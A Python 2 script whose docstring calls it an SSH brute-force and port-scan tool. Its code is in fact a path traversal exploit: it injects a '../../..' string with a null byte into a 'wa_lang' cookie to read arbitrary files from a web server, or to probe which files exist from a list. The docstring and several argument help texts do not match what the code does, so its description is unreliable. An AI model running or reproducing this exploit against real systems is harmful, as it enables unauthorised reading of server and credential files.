"""
Script to Login Bruteforce and Portscan with Banner Grabbing over SSH
Author: Eduardo Alves (edu2008 live com) - 2014
"""
import sys
import urllib2
import argparse
import sys
from sys import stdout



#Constants
PORT = 22
TIMEOUT = 2
PATH = "../../../../../../../../../.."


#Arguments
parser = argparse.ArgumentParser(description='SSH BruteForce.')
parser.add_argument('-H','--host',required=True, help='Target Address.(Ex: example.com)')
parser.add_argument('-m','--mode',help='T')
parser.add_argument('-i','--input',help='Target Port.Ex: (22)')
parser.add_argument('-d','--delay',help='Delay on scan. Works only in Scan List.(Ex: 1)')

args = parser.parse_args()

class textColor:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def checkFiles(host, checkfiles):

	try:
		# target = sys.argv[1]
		url = 'http://'+host
		discoveredFiles = ""
		
		fd = open(checkfiles, "r")
		for requestFile in fd.readlines():
				op = urllib2.build_opener()
				#remove backspace after file
				requestFile = requestFile.rstrip('\n')
			
				#Cookie manipulate with Null Byte Injection Concat
				op.addheaders.append(('Cookie', 'wa_lang='+PATH+requestFile+'%00'))
				
				try:
					f = op.open(url)
					result =  f.read()
				
					if result.find("is not a valid path") == -1:
						print textColor.OKGREEN+"[+] " + requestFile+textColor.ENDC
					else:
						print textColor.WARNING+"[-] " + requestFile+textColor.ENDC
				except urllib2.HTTPError, e:
					print textColor.FAIL+"["+str(e.code)+"] " + requestFile+textColor.ENDC
	except KeyboardInterrupt:
   				sys.exit(" Exiting...")

	
def readFile(host, openfile):
	url = 'http://'+host
	op = urllib2.build_opener()
	op.addheaders.append(('Cookie', 'wa_lang='+PATH+openfile+'%00'))

	f = op.open(url)
	result =  f.read()
	if result.find("Fatal") == -1:
	 #print result 
	 print result.split('<!DOCTYPE html')[0]
	 exit(0)
	else:
	 #print result
	 pass	



def main():
	
	if args.mode=="file":
		readFile(args.host, args.input)
	elif args.mode=="dir":
		checkFiles(args.host, args.input)
	else:
		sys.exit("Invalid option\nUse \'file\' or \'dir\'" )	

if __name__ == "__main__":
	main()